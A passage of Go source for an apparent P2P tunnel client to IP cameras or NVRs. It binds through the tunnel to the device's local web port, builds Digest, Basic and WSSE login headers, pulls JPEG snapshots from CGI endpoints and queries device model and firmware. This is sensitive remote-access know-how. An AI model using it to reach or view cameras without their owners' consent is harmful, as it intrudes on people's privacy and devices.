				if len(parts) == 2 && len(passParts) == 2 {
					u := stripDecor(parts[1])
					p := stripDecor(passParts[1])
					if u != "" && p != "" {
						return u, p, true
					}
				}
			}
		}
	}
	return "", "", false
}

func dhipSessInt(v any) int {
	switch x := v.(type) {
	case float64:
		return int(x)
	case int:
		return x
	}
	return 0
}

func (t *PTCPTunnel) doHTTP(req []byte, timeout time.Duration) ([]byte, error) {
	realm := rand.Uint32()
	if err := t.doBind(realm); err != nil {
		return nil, fmt.Errorf("bind: %w", err)
	}
	defer t.DisconnectRealm(realm)
	return t.DoHTTPOnRealm(realm, req, timeout)
}

func (t *PTCPTunnel) doBind(realm uint32) error {
	host := "127.0.0.1"
	port := uint32(80)
	ip := net.ParseIP(host)

	bindBody := make([]byte, 20)
	bindBody[0] = 0x11
	binary.BigEndian.PutUint32(bindBody[4:8], realm)
	binary.BigEndian.PutUint32(bindBody[12:16], port)
	copy(bindBody[16:20], ip.To4())

	conn := t.conn
	destAddr := t.addr

	pkt := t.session.Send(bindBody)
	if err := t.client.sendTo(conn, destAddr, pkt.Serialize()); err != nil {
		return fmt.Errorf("bind send: %w", err)
	}

	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	buf := make([]byte, 4096)
	n, _, err := conn.ReadFrom(buf)
	if err != nil {
		return fmt.Errorf("bind response: %w", err)
	}
	resp, pErr := ParsePTCPPacket(buf[:n])
	if pErr != nil {
		return pErr
	}
	t.session.Receive(resp)

	for attempts := 0; attempts < 5; attempts++ {
		if len(resp.Body) == 0 || resp.Body[0] == 0x13 {
			if len(resp.Body) > 0 && resp.Body[0] == 0x13 {
				ackPkt := t.session.Send([]byte{})
				t.client.sendTo(conn, destAddr, ackPkt.Serialize())
			}
			conn.SetReadDeadline(time.Now().Add(10 * time.Second))
			n, _, err = conn.ReadFrom(buf)
			if err != nil {
				return fmt.Errorf("bind response: %w", err)
			}
			resp, pErr = ParsePTCPPacket(buf[:n])
			if pErr != nil {
				return pErr
			}
			t.session.Receive(resp)
			if len(resp.Body) > 0 && resp.Body[0] == 0x12 {
				break
			}
		} else if len(resp.Body) > 0 && resp.Body[0] == 0x12 {
			break
		} else {
			return fmt.Errorf("unexpected bind response: body[0]=0x%02x", bodyByte(resp.Body))
		}
	}
	if len(resp.Body) == 0 || resp.Body[0] != 0x12 {
		return fmt.Errorf("bind fail: body[0]=0x%02x", bodyByte(resp.Body))
	}
	return nil
}

func wsseAuthHeader(username, password string) string {
	nonce := fmt.Sprintf("%d", rand.Uint32())
	created := time.Now().UTC().Format("2006-01-02T15:04:05Z")
	digestInput := nonce + created + password
	h := sha1.New()
	io.WriteString(h, digestInput)
	digest := base64.StdEncoding.EncodeToString(h.Sum(nil))
	return fmt.Sprintf("Authorization: WSSE profile=\"UsernameToken\"\r\nX-WSSE: UsernameToken Username=\"%s\", PasswordDigest=\"%s\", Nonce=\"%s\", Created=\"%s\"",
		username, digest, nonce, created)
}

func basicAuthHeader(username, password string) string {
	auth := username + ":" + password
	encoded := base64.StdEncoding.EncodeToString([]byte(auth))
	return "Authorization: Basic " + encoded
}

func selectAuthHeader(reqStr string, authHeaders []string, user, pass string) string {
	return selectAuthHeaderVariant(reqStr, authHeaders, user, pass, 0)
}

func selectAuthHeaderVariant(reqStr string, authHeaders []string, user, pass string, variant int) string {
	selected := ""
	priority := 0
	for _, h := range authHeaders {
		var p int
		switch {
		case strings.HasPrefix(h, "Digest"):
			p = 4
		case strings.HasPrefix(h, "Basic"):
			p = 3
		case strings.HasPrefix(h, "WSSE"):
			p = 2
		default:
			p = 1
		}
		if p > priority {
			priority = p
			selected = h
		}
	}
	if selected == "" {
		return ""
	}

	if strings.HasPrefix(selected, "Digest") {
		method := "GET"
		uri := "/"
		if parts := strings.SplitN(reqStr, " ", 3); len(parts) >= 2 {
			method = parts[0]
			uri = parts[1]
		}
		return digestAuthHeaderVariant(user, pass, method, uri, selected, variant)
	}
	if strings.HasPrefix(selected, "Basic") {
		return basicAuthHeader(user, pass)
	}
	if strings.HasPrefix(selected, "WSSE") {
		return wsseAuthHeader(user, pass)
	}
	return wsseAuthHeader(user, pass)
}

func digestAuthHeaderVariant(username, password, method, uri, wwwAuth string, variant int) string {
	authBody := strings.TrimSpace(wwwAuth)
	if strings.HasPrefix(strings.ToLower(authBody), "digest ") {
		authBody = strings.TrimSpace(authBody[7:])
	}

	params := make(map[string]string)
	for _, part := range strings.Split(authBody, ",") {
		part = strings.TrimSpace(part)
		if idx := strings.Index(part, "="); idx >= 0 {
			key := strings.TrimSpace(part[:idx])
			val := strings.Trim(strings.TrimSpace(part[idx+1:]), "\"")
			params[key] = val
		}
	}

	realm := params["realm"]
	nonce := params["nonce"]
	qop := params["qop"]
	opaque := params["opaque"]
	if realm == "" || nonce == "" {
		return ""
	}

	nc := "00000001"
	cnonce := fmt.Sprintf("%08x", rand.Uint32())

	pathOnly := uri
	if qIdx := strings.Index(uri, "?"); qIdx >= 0 {
		pathOnly = uri[:qIdx]
	}

	var ha1 string
	targetURI := uri

	switch variant {
	case 1:
		ha1 = strings.ToUpper(md5Hex(username + ":" + realm + ":" + password))
		targetURI = uri
	case 2:
		ha1 = strings.ToUpper(md5Hex(username + ":" + realm + ":" + password))
		targetURI = pathOnly
	case 3:
		ha1 = md5Hex(username + ":" + realm + ":" + password)
		targetURI = pathOnly
	default:
		ha1 = md5Hex(username + ":" + realm + ":" + password)
		targetURI = uri
	}

	ha2 := md5Hex(method + ":" + targetURI)

	var response string
	if qop == "auth" || qop == "auth-int" {
		response = md5Hex(ha1 + ":" + nonce + ":" + nc + ":" + cnonce + ":" + qop + ":" + ha2)
	} else {
		response = md5Hex(ha1 + ":" + nonce + ":" + ha2)
	}

	auth := fmt.Sprintf(`Digest username="%s", realm="%s", nonce="%s", uri="%s", response="%s"`,
		username, realm, nonce, targetURI, response)
	if opaque != "" {
		auth += fmt.Sprintf(`, opaque="%s"`, opaque)
	}
	if qop != "" {
		auth += fmt.Sprintf(`, qop=%s, nc=%s, cnonce="%s"`, qop, nc, cnonce)
	}
	return "Authorization: " + auth
}

func md5Hex(s string) string {
	h := md5.New()
	io.WriteString(h, s)
	return hex.EncodeToString(h.Sum(nil))
}

func removeAuthHeader(req string) string {
	var result []string
	for _, line := range strings.Split(req, "\r\n") {
		if strings.HasPrefix(line, "Authorization:") || strings.HasPrefix(line, "X-WSSE:") {
			continue
		}
		result = append(result, line)
	}
	return strings.Join(result, "\r\n")
}

func insertAuthHeader(req, authHeader string) string {
	var result []string
	added := false
	for _, line := range strings.Split(req, "\r\n") {
		if strings.HasPrefix(line, "Authorization:") || strings.HasPrefix(line, "X-WSSE:") {
			if !added {
				result = append(result, authHeader)
				added = true
			}
			continue
		}
		result = append(result, line)
	}
	if !added {
		for i, line := range result {
			if line == "" {
				result = append(result[:i], append([]string{authHeader}, result[i:]...)...)
				break
			}
		}
	}
	return strings.Join(result, "\r\n")
}

func (t *PTCPTunnel) Snapshot() ([]byte, error) {
	urls := []string{
		"/cgi-bin/snapshot.cgi?action=snapshot&channel=1",
		"/cgi-bin/snapshot.cgi",
		"/cgi-bin/jpeg.cgi?channel=1",
	}

	for _, u := range urls {
		req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: Mozilla/5.0\r\nAccept: image/jpeg,image/webp,image/*,*/*\r\nConnection: close\r\n\r\n", u)
		resp, err := t.DoHTTPAuth([]byte(req), 10*time.Second)
		if err != nil || len(resp) == 0 {
			continue
		}
		if jpegData, ok := ExtractJPEG(resp); ok {
			return jpegData, nil
		}
	}

	return nil, fmt.Errorf("snapshot failed on all CGI URL variants")
}

func ExtractJPEG(resp []byte) ([]byte, bool) {
	headerEnd := findHeaderEnd(resp)
	if headerEnd < 0 {
		return nil, false
	}
	headers := string(resp[:headerEnd])
	body := resp[headerEnd:]

	if strings.Contains(strings.ToLower(headers), "transfer-encoding: chunked") {
		body = DechunkHTTP(body)
	}

	off := 0
	for off+1 < len(body) {
		rel := bytes.Index(body[off:], []byte{0xFF, 0xD8})
		if rel < 0 {
			break
		}
		soi := off + rel
		eoiRel := bytes.Index(body[soi+2:], []byte{0xFF, 0xD9})
		if eoiRel < 0 {
			break
		}
		candidate := body[soi : soi+2+eoiRel+2]
		if len(candidate) >= 1000 && (decodableJPEG(candidate) || StructurallyValidJPEG(candidate)) {
			return candidate, true
		}
		off = soi + 2
	}

	return nil, false
}

// reports whether bs parses as a whole JPEG
func decodableJPEG(bs []byte) bool {
	_, err := jpeg.Decode(bytes.NewReader(bs))
	return err == nil
}

func isSOFMarker(m byte) bool {
	switch m {
	case 0xC0, 0xC1, 0xC2, 0xC3, 0xC5, 0xC6, 0xC7, 0xC9, 0xCA, 0xCB, 0xCD, 0xCE, 0xCF:
		return true
	}
	return false
}

func StructurallyValidJPEG(data []byte) bool {
	if len(data) < 4 || data[0] != 0xFF || data[1] != 0xD8 {
		return false
	}
	i := 2
	sawSOF, sawSOS := false, false
	for i < len(data) {
		if data[i] != 0xFF {
			return false
		}
		for i < len(data) && data[i] == 0xFF {
			i++
		}
		if i >= len(data) {
			return false
		}
		m := data[i]
		i++
		switch {
		case m == 0xD9: // EOI
			return sawSOF && sawSOS
		case m == 0xD8: // nested SOI
			return false
		case m == 0x01 || (m >= 0xD0 && m <= 0xD7): // standalone markers
			continue
		case m == 0xDA:
			if i+2 > len(data) {
				return false
			}
			segLen := int(data[i])<<8 | int(data[i+1])
			if segLen < 2 || i+segLen > len(data) {
				return false
			}
			sawSOS = true
			i += segLen
			// skip entropy-coded data until the next real marker
			for i+1 < len(data) {
				if data[i] != 0xFF {
					i++
					continue
				}
				nxt := data[i+1]
				if nxt == 0x00 || (nxt >= 0xD0 && nxt <= 0xD7) {
					i += 2
					continue
				}
				break
			}
		default: // segment with a two-byte length
			if i+2 > len(data) {
				return false
			}
			segLen := int(data[i])<<8 | int(data[i+1])
			if segLen < 2 || i+segLen > len(data) {
				return false
			}
			if isSOFMarker(m) {
				sawSOF = true
			}
			i += segLen
		}
	}
	return false
}

func DechunkHTTP(data []byte) []byte {
	var out []byte
	remaining := data
	for len(remaining) > 0 {
		idx := bytes.Index(remaining, []byte("\r\n"))
		if idx < 0 {
			break
		}
		hexStr := strings.TrimSpace(string(remaining[:idx]))
		if extIdx := strings.Index(hexStr, ";"); extIdx >= 0 {
			hexStr = hexStr[:extIdx]
		}
		chunkSize, err := strconv.ParseInt(hexStr, 16, 64)
		if err != nil || chunkSize < 0 {
			return data
		}
		if chunkSize == 0 {
			break
		}
		remaining = remaining[idx+2:]
		if int64(len(remaining)) < chunkSize {
			out = append(out, remaining...)
			break
		}
		out = append(out, remaining[:chunkSize]...)
		remaining = remaining[chunkSize:]
		if len(remaining) >= 2 && remaining[0] == '\r' && remaining[1] == '\n' {
			remaining = remaining[2:]
		}
	}
	if len(out) > 0 {
		return out
	}
	return data
}

func extractBody(resp []byte) []byte {
	idx := findHeaderEnd(resp)
	if idx < 0 {
		return resp
	}
	return resp[idx:]
}

func (t *PTCPTunnel) GetDeviceInfo() (model string, channels int, firmware string, err error) {
	parseKV := func(resp []byte) map[string]string {
		m := make(map[string]string)
		for _, line := range strings.Split(strings.TrimSpace(string(extractBody(resp))), "\n") {
			line = strings.TrimSpace(line)
			if k, v, ok := strings.Cut(line, "="); ok {
				m[strings.TrimSpace(k)] = strings.TrimSpace(v)
			}
		}
		return m
	}

	xmlTag := func(body []byte, tag string) string {
		s := string(body)
		open, close := "<"+tag+">", "</"+tag+">"
		if i := strings.Index(s, open); i >= 0 {
			s = s[i+len(open):]
			if j := strings.Index(s, close); j >= 0 {
				return strings.TrimSpace(s[:j])
			}
		}
		return ""
	}

	isNVRErrorPage := func(resp []byte) bool {
		body := extractBody(resp)
		return len(resp) < 350 && (contains(resp, "Error") || contains(resp, "<html") || contains(body, "Error") || contains(body, "<html"))
	}

	type getResult struct {
		resp    []byte
		nvrPage bool
	}
	doGet := func(path string) getResult {
		req := fmt.Sprintf("GET %s HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n", path)
		resp, e := t.DoHTTPAuth([]byte(req), 5*time.Second)
		if e != nil {
			return getResult{}
		}
		if isNVRErrorPage(resp) {
			return getResult{nvrPage: true}
		}
		return getResult{resp: resp}
	}

	for _, path := range []string{
		"/cgi-bin/magicBox.cgi?action=getSystemInfo",
		"/cgi-bin/configManager.cgi?action=getConfig&name=General.SystemInfo",
	} {
		r := doGet(path)
		if r.nvrPage {
			continue
		}
		if r.resp == nil {
			continue
		}
		body := extractBody(r.resp)
		kv := parseKV(r.resp)
		if m := kv["deviceType"]; m != "" && !hasErrPrefix(m) {
			model = m
			break
		}
		if m := kv["model"]; m != "" && !hasErrPrefix(m) {
			model = m
			break
		}

		if m := xmlTag(body, "deviceType"); m != "" && !hasErrPrefix(m) {
			model = m
			break
		}
		if m := xmlTag(body, "model"); m != "" && !hasErrPrefix(m) {
			model = m
			break
		}
	}

	if model == "" {
		for _, path := range []string{
			"/cgi-bin/magicBox.cgi?action=getDeviceType",
			"/cgi-bin/devicemanager.cgi?action=getDeviceType",
		} {
			r := doGet(path)
			if r.nvrPage {
				continue
			}
			if r.resp == nil {
				continue
			}
			body := extractBody(r.resp)
			if m := strings.TrimSpace(string(body)); m != "" && !hasErrPrefix(m) {

				if v := xmlTag(body, "type"); v != "" {
					m = v
				}
				// keep the bare value
				if kv := parseKV(r.resp); len(kv) > 0 {
					if v := kv["type"]; v != "" {
						m = v
					} else if v := kv["deviceType"]; v != "" {
						m = v
					}
				}
				model = m
				break
			}
		}
	}

	if model == "" && t.user != "" {
		model = t.deviceModelViaDHIP()
	}

	for _, path := range []string{
		"/cgi-bin/magicBox.cgi?action=getSoftwareVersion",
		"/cgi-bin/magicBox.cgi?action=getSystemInfo",
	} {
		r := doGet(path)
		if r.nvrPage {
			break
		}
		if r.resp == nil {
			continue
		}
		body := extractBody(r.resp)
		kv := parseKV(r.resp)
		if fw := kv["version"]; fw != "" {
			firmware = strings.TrimPrefix(fw, "version=")
			break
		}
		if fw := strings.TrimSpace(string(body)); fw != "" && !hasErrPrefix(fw) {
			if v := xmlTag(body, "version"); v != "" {
				fw = v
			}
			firmware = strings.TrimPrefix(fw, "version=")
			break
		}
	}

	r := doGet("/cgi-bin/configManager.cgi?action=getConfig&name=ChannelTitle")
	if !r.nvrPage && r.resp != nil {
		if c := bytes.Count(r.resp, []byte("<table")); c > 0 {
			channels = c
		}
	}
	if channels == 0 {
		channels = 1
	}

	return model, channels, firmware, nil
}

func hasErrPrefix(s string) bool {
	return strings.HasPrefix(s, "Error") || strings.Contains(s, "Bad Request")
}

// fetch the model over DHIP
func (t *PTCPTunnel) deviceModelViaDHIP() string {
	for _, port := range []int{80, 5000} {
		dhip, err := t.NewDHIPClientOnPort(port)
		if err != nil {
			continue
		}
		if err := dhip.LoginNormal(t.user, t.pass); err != nil {
			dhip.Close()
			continue
		}
		model := dhip.DeviceModel()
		dhip.Close()
		if model != "" {
			return model
		}
	}
	return ""
}

// ask the session for the device type
func (c *DHIPClient) DeviceModel() string {
	if r, err := c.Call("magicBox.getDeviceType", nil, 5, nil, nil); err == nil {
		if p, ok := r["params"].(map[string]any); ok {
			if s, _ := p["type"].(string); s != "" {
				return s
			}
			if s, _ := p["deviceType"].(string); s != "" {
				return s
			}
		}
	}
	if r, err := c.Call("magicBox.getSystemInfo", nil, 6, nil, nil); err == nil {
		if p, ok := r["params"].(map[string]any); ok {
			if table, ok := p["table"].([]any); ok && len(table) > 0 {
				if m, ok := table[0].(map[string]any); ok {
					if s, _ := m["deviceType"].(string); s != "" {
						return s
					}
				}
			}
		}
	}
	return ""
}

func findHeaderEnd(data []byte) int {
	for i := 0; i < len(data)-3; i++ {
		if data[i] == '\r' && data[i+1] == '\n' && data[i+2] == '\r' && data[i+3] == '\n' {
			return i + 4
		}
	}
	return -1
}

func parseContentLength(s string) int {
	marker := "Content-Length: "
	idx := strings.Index(s, marker)
	if idx < 0 {
		marker = "content-length: "
		idx = strings.Index(s, marker)
	}
	if idx < 0 {
		return 0
	}
	val := 0
	for _, c := range s[idx+len(marker):] {
		if c >= '0' && c <= '9' {
			val = val*10 + int(c-'0')
		} else {
			break
		}
	}
	return val
}

func contains(data []byte, substr string) bool {
	return bytes.Contains(data, []byte(substr))
}
